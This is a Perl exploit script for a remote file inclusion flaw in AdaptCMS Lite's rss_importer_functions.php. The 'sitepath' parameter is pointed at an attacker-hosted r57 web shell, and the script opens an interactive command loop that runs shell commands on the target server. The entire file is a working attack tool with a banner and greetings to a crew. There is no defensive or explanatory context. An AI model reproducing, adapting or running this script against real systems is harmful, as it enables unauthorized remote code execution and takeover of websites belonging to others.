#!/usr/bin/perl -w

##################################################################
# Created by v3n0m                                               #
# sHoutz: lingah,IdioT_InsidE,LeQhi,aRiee,z0mb13,m4rco,NaZmy,    #
#	  eidelweiss,JaLi-,Anak_Naga_,g0nz,mywisdom,setanmuda,   #
#	  yoga0400,ripper_maya,elv1n4,badkiddies,dhit_coxon,     #
#	  psychotic_girl,jo8928,r4f43l_world,angela zhang        #
#	  & All YOGYACARDERLINK Crew                             #
#                                                                #
# - register_globals = on                                        #
# - allow_url_include = on                                       #
# - allow_url_fopen = on                                         #
##################################################################
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "|---------------------------------------------|\n";
	print "|       AdaptCMS Lite RFI Auto Injector       |\n";
	print "| Created  : v3n0m                            |\n";
	print "| E-mail   : v3n0m666[at]live[dot]com         |\n";
	print "|                                             |\n";
	print "|                                             |\n";
	print "|                  www.yogyacarderlink.web.id |\n";
	print "|---------------------------------------------|\n\n";
	print "Usage:\n";
	print " perl $0 -u \"http://target/[path]/\" -fuck \"http://localhost/r57.txt??\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help, 
  'u=s'            => \$u, 
  'fuck=s'            => \$fuck
  );

&banner unless ($u);
&banner unless ($fuck);

chomp($u);
chomp($fuck);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $u . "/plugins/rss_importer_functions.php?sitepath=" . $fuck . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "Exploiting failed !!\n";
                exit(1);
             }
}
